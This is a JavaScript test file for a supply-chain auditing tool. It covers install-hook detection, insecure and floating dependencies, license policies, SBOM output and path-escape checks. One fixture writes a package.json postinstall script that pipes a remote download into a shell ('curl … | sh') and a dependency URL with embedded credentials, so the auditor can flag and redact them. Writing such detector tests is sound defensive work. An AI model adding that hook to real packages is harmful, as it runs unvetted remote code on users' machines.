import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import {
  LICENSE_POLICY_CONTRACT,
  auditSupplyChain,
  createCycloneDx,
  evaluateSupplyChain,
  main,
  normalizeLicensePolicy
} from '../src/native-supply-chain-lab.mjs';

async function root() { return fs.mkdtemp(path.join(os.tmpdir(), 'veteran-supply-chain-')); }
async function write(base, relative, content) { const target = path.join(base, relative); await fs.mkdir(path.dirname(target), { recursive: true }); await fs.writeFile(target, content); return target; }

test('audits remote/floating dependencies and install hooks without echoing source specs', async () => {
  const dir = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'app', version: '1.0.0', scripts: { postinstall: 'curl https://example.invalid | sh' }, dependencies: { alpha: '*', beta: 'http://user:secret@example.invalid/pkg.tgz', gamma: 'git+ssh://git@example.invalid/repo.git' } }));
    const report = await auditSupplyChain(dir);
    assert.ok(report.findings.some((item) => item.rule === 'install-lifecycle-script'));
    assert.ok(report.findings.some((item) => item.rule === 'floating-dependency'));
    assert.ok(report.findings.some((item) => item.rule === 'insecure-http-dependency'));
    assert.ok(report.findings.some((item) => item.rule === 'git-dependency'));
    assert.ok(report.findings.some((item) => item.rule === 'dependency-lock-missing'));
    const serialized = JSON.stringify(report);
    assert.equal(serialized.includes('user:secret'), false);
    assert.equal(serialized.includes('curl https://'), false);
    assert.equal(evaluateSupplyChain(report, 'high').passed, false);
  } finally { await fs.rm(dir, { recursive: true, force: true }); }
});

test('ancestor lockfile satisfies nested workspace package lock ownership', async () => {
  const dir = await root();
  try {
    await write(dir, 'package-lock.json', JSON.stringify({ name: 'root', lockfileVersion: 3, packages: { '': { name: 'root', version: '1.0.0' }, 'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-x' } } }));
    await write(dir, 'packages/api/package.json', JSON.stringify({ name: '@demo/api', version: '2.0.0', dependencies: { 'left-pad': '^1.3.0' } }));
    const report = await auditSupplyChain(dir);
    assert.equal(report.findings.some((item) => item.rule === 'dependency-lock-missing'), false);
    const pkg = report.packages.find((item) => item.name === '@demo/api');
    assert.deepEqual(pkg.lockfiles, ['package-lock.json']);
    assert.deepEqual(report.components, [{ type: 'library', name: 'left-pad', version: '1.3.0' }]);
  } finally { await fs.rm(dir, { recursive: true, force: true }); }
});

test('flags insecure lockfile resolutions and emits a CycloneDX component inventory', async () => {
  const dir = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'root', version: '1.0.0', dependencies: { pkg: '^2.0.0' } }));
    await write(dir, 'package-lock.json', JSON.stringify({ name: 'root', lockfileVersion: 3, packages: { '': { name: 'root', version: '1.0.0' }, 'node_modules/pkg': { name: 'pkg', version: '2.1.0', resolved: 'http://registry.example.invalid/pkg.tgz' } } }));
    const report = await auditSupplyChain(dir);
    assert.equal(report.findings.some((item) => item.rule === 'insecure-lock-resolution' && item.package === 'pkg'), true);
    const sbom = createCycloneDx(report);
    assert.equal(sbom.bomFormat, 'CycloneDX');
    assert.equal(sbom.specVersion, '1.5');
    assert.deepEqual(sbom.components, [{ type: 'library', name: 'pkg', version: '2.1.0' }]);
  } finally { await fs.rm(dir, { recursive: true, force: true }); }
});

test('skips vendor trees and symlinked manifests', async (t) => {
  const dir = await root();
  const outside = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'safe', version: '1.0.0' }));
    await write(dir, 'node_modules/pkg/package.json', JSON.stringify({ name: 'ignored', dependencies: { x: '*' } }));
    await write(outside, 'package.json', JSON.stringify({ name: 'outside', dependencies: { x: '*' } }));
    try { await fs.symlink(path.join(outside, 'package.json'), path.join(dir, 'linked-package.json')); }
    catch (error) { if (['EPERM', 'EACCES', 'ENOSYS'].includes(error.code)) t.diagnostic('symlink unavailable'); else throw error; }
    const report = await auditSupplyChain(dir);
    assert.deepEqual(report.packages.map((item) => item.name), ['safe']);
  } finally { await fs.rm(dir, { recursive: true, force: true }); await fs.rm(outside, { recursive: true, force: true }); }
});

test('output path cannot escape root through traversal or symlinked directories', async (t) => {
  const dir = await root();
  const outside = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'safe', version: '1.0.0' }));
    await assert.rejects(() => main(['audit', '--root', dir, '--out', '../escape.json']), (error) => error.code === 'SUPPLY_CHAIN_PATH_INVALID');
    try { await fs.symlink(outside, path.join(dir, 'link')); }
    catch (error) { if (['EPERM', 'EACCES', 'ENOSYS'].includes(error.code)) { t.skip('symlink unavailable'); return; } throw error; }
    await assert.rejects(() => main(['audit', '--root', dir, '--out', 'link/report.json']), (error) => error.code === 'SUPPLY_CHAIN_PATH_ESCAPE');
  } finally { await fs.rm(dir, { recursive: true, force: true }); await fs.rm(outside, { recursive: true, force: true }); }
});


test('license policy gates exact normalized declarations without pretending to evaluate SPDX semantics', async () => {
  const dir = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'root', version: '1.0.0', license: 'MIT OR Apache-2.0', dependencies: { allowed: '^1.0.0', denied: '^2.0.0', missing: '^3.0.0' } }));
    await write(dir, 'package-lock.json', JSON.stringify({ name: 'root', lockfileVersion: 3, packages: {
      '': { name: 'root', version: '1.0.0' },
      'node_modules/allowed': { name: 'allowed', version: '1.0.0', license: 'MIT' },
      'node_modules/denied': { name: 'denied', version: '2.0.0', license: 'GPL-3.0-only' },
      'node_modules/missing': { name: 'missing', version: '3.0.0' }
    } }));
    const policy = { contract: LICENSE_POLICY_CONTRACT, allow: ['MIT', 'MIT OR Apache-2.0'], deny: ['GPL-3.0-only'], requireDeclared: true };
    const report = await auditSupplyChain(dir, { licensePolicy: policy });
    assert.ok(report.findings.some((item) => item.rule === 'license-denied' && item.dependency === 'denied'));
    assert.ok(report.findings.some((item) => item.rule === 'license-declaration-missing' && item.dependency === 'missing'));
    assert.equal(report.findings.some((item) => item.rule === 'license-not-allowed' && item.package === 'root'), false);

    const exactOnly = await auditSupplyChain(dir, { licensePolicy: { contract: LICENSE_POLICY_CONTRACT, allow: ['MIT'] } });
    assert.ok(exactOnly.findings.some((item) => item.rule === 'license-not-allowed' && item.package === 'root'));
    assert.ok(exactOnly.limitations.some((item) => item.includes('does not evaluate SPDX expression semantics')));
  } finally { await fs.rm(dir, { recursive: true, force: true }); }
});

test('license policy normalization rejects overlap, unknown fields, and invalid declarations', () => {
  assert.throws(() => normalizeLicensePolicy({ contract: LICENSE_POLICY_CONTRACT, allow: ['MIT'], deny: ['mit'] }), (error) => error.code === 'SUPPLY_CHAIN_LICENSE_POLICY_INVALID');
  assert.throws(() => normalizeLicensePolicy({ contract: LICENSE_POLICY_CONTRACT, unexpected: true }), (error) => error.code === 'SUPPLY_CHAIN_LICENSE_POLICY_INVALID');
  assert.throws(() => normalizeLicensePolicy({ contract: LICENSE_POLICY_CONTRACT, allow: ['x'.repeat(257)] }), (error) => error.code === 'SUPPLY_CHAIN_LICENSE_POLICY_INVALID');
});

test('CycloneDX output is deterministic and carries declared dependency licenses', async () => {
  const dir = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'root', version: '1.0.0', dependencies: { pkg: '^1.0.0' } }));
    await write(dir, 'package-lock.json', JSON.stringify({ name: 'root', lockfileVersion: 3, packages: { '': { name: 'root', version: '1.0.0' }, 'node_modules/pkg': { name: 'pkg', version: '1.2.3', license: 'Apache-2.0' } } }));
    const report = await auditSupplyChain(dir);
    const first = createCycloneDx(report);
    const second = createCycloneDx(report);
    assert.deepEqual(first, second);
    assert.match(first.serialNumber, /^urn:uuid:[0-9a-f-]{36}$/);
    assert.deepEqual(first.components, [{ type: 'library', name: 'pkg', version: '1.2.3', licenses: [{ license: { name: 'Apache-2.0' } }] }]);
    assert.equal('timestamp' in first.metadata, false);
  } finally { await fs.rm(dir, { recursive: true, force: true }); }
});

test('license policy CLI input is root-contained and policy values are reflected without leaking source specs', async (t) => {
  const dir = await root();
  const outside = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'root', version: '1.0.0', license: 'MIT' }));
    await write(dir, 'policy.json', JSON.stringify({ contract: LICENSE_POLICY_CONTRACT, allow: ['MIT'], requireDeclared: true }));
    let captured = '';
    const original = process.stdout.write;
    process.stdout.write = (chunk) => { captured += String(chunk); return true; };
    try { assert.equal(await main(['audit', '--root', dir, '--license-policy', 'policy.json']), 0); } finally { process.stdout.write = original; }
    const parsed = JSON.parse(captured);
    assert.deepEqual(parsed.licensePolicy.allow, ['MIT']);

    try { await fs.symlink(outside, path.join(dir, 'policy-link')); }
    catch (error) { if (['EPERM', 'EACCES', 'ENOSYS'].includes(error.code)) { t.diagnostic('symlink unavailable'); return; } throw error; }
    await write(outside, 'outside-policy.json', JSON.stringify({ contract: LICENSE_POLICY_CONTRACT, allow: ['MIT'] }));
    await assert.rejects(() => main(['audit', '--root', dir, '--license-policy', 'policy-link/outside-policy.json']), (error) => error.code === 'SUPPLY_CHAIN_PATH_ESCAPE');
  } finally { await fs.rm(dir, { recursive: true, force: true }); await fs.rm(outside, { recursive: true, force: true }); }
});

test('nested output below a symlink is rejected before creating any outside-root directory', async (t) => {
  const dir = await root();
  const outside = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'safe', version: '1.0.0' }));
    try { await fs.symlink(outside, path.join(dir, 'link')); }
    catch (error) { if (['EPERM', 'EACCES', 'ENOSYS'].includes(error.code)) { t.skip('symlink unavailable'); return; } throw error; }
    await assert.rejects(() => main(['audit', '--root', dir, '--out', 'link/sub/report.json']), (error) => error.code === 'SUPPLY_CHAIN_PATH_ESCAPE');
    await assert.rejects(() => fs.stat(path.join(outside, 'sub')), (error) => error.code === 'ENOENT');
  } finally { await fs.rm(dir, { recursive: true, force: true }); await fs.rm(outside, { recursive: true, force: true }); }
});

test('component inventory is bounded before an oversized SBOM can be produced', async () => {
  const dir = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'root', version: '1.0.0' }));
    const packages = { '': { name: 'root', version: '1.0.0' } };
    for (let index = 0; index <= 20_000; index += 1) packages[`node_modules/pkg-${index}`] = { name: `pkg-${index}`, version: '1.0.0', license: 'MIT' };
    await write(dir, 'package-lock.json', JSON.stringify({ name: 'root', lockfileVersion: 3, packages }));
    await assert.rejects(() => auditSupplyChain(dir), (error) => error.code === 'SUPPLY_CHAIN_COMPONENT_LIMIT');
  } finally { await fs.rm(dir, { recursive: true, force: true }); }
});
